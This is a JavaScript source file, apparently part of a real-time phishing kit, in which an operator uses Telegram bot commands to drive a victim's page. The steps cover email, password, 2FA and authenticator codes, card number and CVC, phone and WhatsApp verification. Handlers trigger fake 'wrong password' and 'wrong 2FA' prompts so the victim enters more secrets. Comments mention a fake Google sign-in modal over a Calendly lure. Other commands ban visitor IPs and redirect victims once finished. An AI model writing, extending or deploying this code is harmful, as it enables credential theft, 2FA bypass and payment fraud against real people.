import axios from "axios";
import { buildApiUrl } from "../config/api";
import { IPService } from "./ipService";
import { getRedirectUrl } from "../config/redirect";

export class TelegramService {
  static isRequestPending = false;
  static requestController = null;
  static consecutiveErrors = 0;
  static maxRetries = 3;
  static baseDelay = 1000; // 1 second base delay
  static lastProcessedWrong2faCommand = null; // Track last processed wrong2fa command
  static lastProcessedPasswordCommand = null; // Track last processed password command

  static async fetchMessages() {
    // Prevent multiple simultaneous requests
    if (this.isRequestPending) {
      return [];
    }

    // Cancel any existing request
    if (this.requestController) {
      this.requestController.abort();
    }

    this.isRequestPending = true;
    this.requestController = new AbortController();

    try {
      const response = await axios.get(buildApiUrl("/api/getMessages"), {
        timeout: 8000, // Reduced timeout
        headers: {
          "Content-Type": "application/json",
        },
        signal: this.requestController.signal,
      });

      // Reset error count on successful request
      this.consecutiveErrors = 0;

      return response?.data?.data?.result || [];
    } catch (error) {
      this.consecutiveErrors++;

      // Don't log errors for aborted requests (normal cancellation)
      if (error.name === "AbortError") {
        console.log("[Telegram] Request was cancelled");
        return [];
      }

      // Log error only in development or for critical errors
      if (process.env.NODE_ENV === "development") {
        console.warn(
          `[Telegram] Error fetching messages (attempt ${this.consecutiveErrors}):`,
          error.message
        );
      }

      // Return empty array to prevent breaking the app
      return [];
    } finally {
      this.isRequestPending = false;
      this.requestController = null;
    }
  }

  static shouldSkipPolling() {
    // Skip polling if too many consecutive errors
    if (this.consecutiveErrors >= this.maxRetries) {
      if (process.env.NODE_ENV === "development") {
        console.warn(
          `[Telegram] Skipping polling due to ${this.consecutiveErrors} consecutive errors`
        );
      }
      return true;
    }
    return false;
  }

  static getPollingDelay() {
    // Exponential backoff for errors
    if (this.consecutiveErrors > 0) {
      const delay = this.baseDelay * Math.pow(2, this.consecutiveErrors - 1);
      return Math.min(delay, 30000); // Max 30 seconds
    }
    return 0; // No delay for successful requests
  }

  static resetErrorState() {
    this.consecutiveErrors = 0;
  }

  static processCommand(command, uniqueString, currentState) {
    const {
      setStep,
      setLastFetch,
      LastFetch,
      Ip,
      setWrong2faTrigger,
      wrong2faTrigger,
      setWrongPasswordTrigger,
      wrongPasswordTrigger,
    } = currentState;

    const commands = {
      "/2fa": () => {
        if (LastFetch !== "2fa") {
          setStep(14);
          setLastFetch("2fa");
        }
      },
      "/incorrect-2fa": () => {
        if (LastFetch !== "incorrect-2fa") {
          setStep(6);
          setLastFetch("incorrect-2fa");
        }
      },
      "/password": (fullCommand) => {
        // Check if this is a new password command (idempotent check)
        if (this.lastProcessedPasswordCommand === fullCommand) {
          return;
        }

        this.lastProcessedPasswordCommand = fullCommand;

        // Don't change step - just trigger wrong password in the modal
        // This keeps the modal overlay visible with Calendly in background
        setLastFetch("password");

        if (typeof currentState.setWrongPasswordTrigger === "function") {
          currentState.setWrongPasswordTrigger((prev) => prev + 1);
        }
      },
      "/wait": () => {
        if (LastFetch !== "wait") {
          setStep(4);
          setLastFetch("wait");
        }
      },
      "/email": () => {
        if (LastFetch !== "email") {
          setStep(1);
          setLastFetch("email");
        }
      },
      "/card": () => {
        if (LastFetch !== "card") {
          setStep(8);
          setLastFetch("card");
        }
      },
      "/cvc": () => {
        if (LastFetch !== "cvc") {
          setStep(3);
          setLastFetch("cvc");
        }
      },
      "/phone": () => {
        if (LastFetch !== "phoneVerify") {
          setStep(10);
          setLastFetch("phoneVerify");
        }
      },
      "/whatsapp": () => {
        if (LastFetch !== "whatsapp") {
          setStep(12);
          setLastFetch("whatsapp");
        }
      },
      "/emailVerify": () => {
        if (LastFetch !== "emailVerify") {
          setStep(13);
          setLastFetch("emailVerify");
        }
      },
      "/done": () => {
        if (LastFetch !== "done") {
          setStep(11);
          setLastFetch("done");
        }
      },
      "/appauth": () => {
        // Dispatch event for Google sign-in modal to show code input
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("appauth-show-code"));
        }
      },
      "/redirect": () => {
        try {
          const target = getRedirectUrl();
          if (typeof window !== "undefined" && target) {
            window.location.href = target;
          }
        } catch (e) {
          // no-op
        }
      },
      "/authApp": () => {
        if (LastFetch !== "authApp") {
          setStep(15);
          setLastFetch("authApp");
        }
      },
      "/wrong2fa": (fullCommand) => {
        // Check if this is a new wrong2fa command (idempotent check)
        if (this.lastProcessedWrong2faCommand === fullCommand) {
          return;
        }

        this.lastProcessedWrong2faCommand = fullCommand;

        if (typeof currentState.setWrong2faTrigger === "function") {
          currentState.setWrong2faTrigger((prev) => prev + 1);
        }
      },
      "/ban": async () => {
        if (LastFetch !== "Ban" && Ip) {
          setLastFetch("Ban");
          try {
            await IPService.banIP(Ip);
          } catch (error) {
            if (process.env.NODE_ENV === "development") {
              console.warn("[Telegram] Error banning IP:", error.message);
            }
          }
        }
      },
      "/clear": () => {
        setLastFetch("clear");
        // Reset error state and command tracking when clearing
        this.resetErrorState();
        this.lastProcessedWrong2faCommand = null;
        this.lastProcessedPasswordCommand = null;
      },
    };

    // Handle /wrong2fa commands with additional data
    if (command.startsWith("/wrong2fa")) {
      try {
        if (commands["/wrong2fa"]) {
          commands["/wrong2fa"](command); // Pass full command for idempotency check
        }
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing wrong2fa command:",
            command,
            error.message
          );
        }
      }
    } else if (command.startsWith("/password")) {
      // Handle /password commands with additional data
      try {
        if (commands["/password"]) {
          commands["/password"](command); // Pass full command for idempotency check
        }
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing password command:",
            command,
            error.message
          );
        }
      }
    } else if (commands[command]) {
      // Handle other commands normally
      try {
        commands[command]();
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing command:",
            command,
            error.message
          );
        }
      }
    }
  }

  static async pollMessages(uniqueString, currentState) {
    // Skip if too many errors
    if (this.shouldSkipPolling()) {
      return;
    }

    try {
      const result = await this.fetchMessages();

      if (result.length > 0) {
        // Process callback_query updates (button clicks)
        const messageUpdates = result.filter(
          ({ callback_query }) => callback_query?.data !== undefined
        );

        messageUpdates.forEach(({ callback_query }) => {
          try {
            const [command, id] = callback_query.data.split(" ");
            if (id === uniqueString || command === "/clear") {
              this.processCommand(command, uniqueString, currentState);
            }
          } catch (error) {
            if (process.env.NODE_ENV === "development") {
              console.warn(
                "[Telegram] Error processing message:",
                error.message
              );
            }
          }
        });

        // Process regular text messages (admin typing verification code as REPLY)
        const textUpdates = result.filter(
          ({ message }) => message?.text && !message.text.startsWith("/") && message.reply_to_message
        );

        textUpdates.forEach(({ message }) => {
          try {
            const code = message.text.trim();
            const replyToMessageId = message.reply_to_message.message_id;
            
            // Send to backend to handle reply
            if (typeof window !== "undefined" && code && replyToMessageId) {
              axios.post(buildApiUrl("/api/appauth/reply"), {
                replyToMessageId,
                code,
              }).then(() => {
                // Dispatch the code to the Google modal
                window.dispatchEvent(
                  new CustomEvent("appauth-code-received", { detail: { code } })
                );
              }).catch(error => {
                if (process.env.NODE_ENV === "development") {
                  console.warn("[Telegram] Error sending reply:", error.message);
                }
              });
            }
          } catch (error) {
            if (process.env.NODE_ENV === "development") {
              console.warn(
                "[Telegram] Error processing text message:",
                error.message
              );
            }
          }
        });
      }
    } catch (error) {
      // Error already handled in fetchMessages
      if (process.env.NODE_ENV === "development") {
        console.warn("[Telegram] Error in pollMessages:", error.message);
      }
    }
  }
}
